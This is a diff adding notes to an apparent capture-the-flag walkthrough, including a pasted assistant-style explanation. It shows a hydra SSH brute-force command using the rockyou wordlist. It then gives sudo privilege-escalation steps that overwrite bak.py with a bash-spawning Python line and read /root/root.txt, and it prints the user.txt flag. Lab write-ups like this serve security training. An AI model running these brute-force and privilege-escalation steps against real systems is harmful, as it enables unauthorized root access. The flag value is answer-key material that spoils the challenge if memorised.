@@ -3,3 +3,51 @@ hydra -l "target_user" -P /usr/share/wordlists/rockyou.txt -t 4 ssh:"target_ip_a
 once password found
 
 ssh "target_user"@"target_ip_address"
+
+You’ve successfully logged in as meliodas, retrieved the user.txt flag, and found an interesting privilege escalation vector. Here’s how to proceed:
+
+1. Review sudo Permissions:
+The sudo -l output shows that meliodas can execute any Python script named /home/meliodas/bak.py as root without a password. This can be exploited to achieve privilege escalation.
+
+2. Inspect bak.py:
+Examine the contents of the bak.py file to understand its function:
+
+bash
+Copy code
+cat /home/meliodas/bak.py
+3. Modify or Replace bak.py:
+Since you have permission to execute the script with sudo, you can modify or replace it to spawn a root shell. Here’s how:
+
+(a) Backup the Original Script:
+bash
+Copy code
+cp /home/meliodas/bak.py /home/meliodas/bak.py.bak
+(b) Edit the Script:
+Overwrite the bak.py file to spawn a root shell:
+
+bash
+Copy code
+echo "import os; os.system('/bin/bash')" > /home/meliodas/bak.py
+4. Execute the Modified Script:
+Run the script as root using sudo:
+
+bash
+Copy code
+sudo /usr/bin/python /home/meliodas/bak.py
+This should drop you into a root shell.
+
+5. Retrieve the root.txt Flag:
+Once in the root shell:
+
+bash
+Copy code
+cat /root/root.txt
+6. Restore the Original Script (Optional):
+If needed, restore the original bak.py script:
+
+bash
+Copy code
+mv /home/meliodas/bak.py.bak /home/meliodas/bak.py
+Summary:
+user.txt: 6d488cbb3f111d135722c33cb635f4ec
+root.txt: Retrieve this after escalating privileges and accessing /root/root.txt.
